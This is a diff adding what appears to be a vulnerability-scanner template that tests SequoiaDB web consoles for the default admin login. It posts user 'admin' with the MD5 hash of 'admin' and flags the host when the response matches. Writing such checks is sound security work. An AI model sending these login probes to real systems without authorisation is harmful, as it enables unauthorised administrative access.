@@ -1,0 +1,25 @@
+id:
+name: Sequoiadb-Default-Login
+transport: http
+tags:
+  - SequoiaDB
+rules:
+  req:
+    request:
+      cache: true
+      method: POST
+      path: /
+      headers:
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        SdbLanguage: zh-CN
+      body: cmd=login&user=admin&passwd=21232f297a57a5a743894a0e4a801fc3
+    expression: response.status==200 &&
+                response.body.bcontains(b'errno') &&
+                response.body.bcontains(b'0')
+expression: req()
+detail:
+  vulnerability:
+    proof:
+      info: "存在Sequoiadb-Default-Login默认口令漏洞"
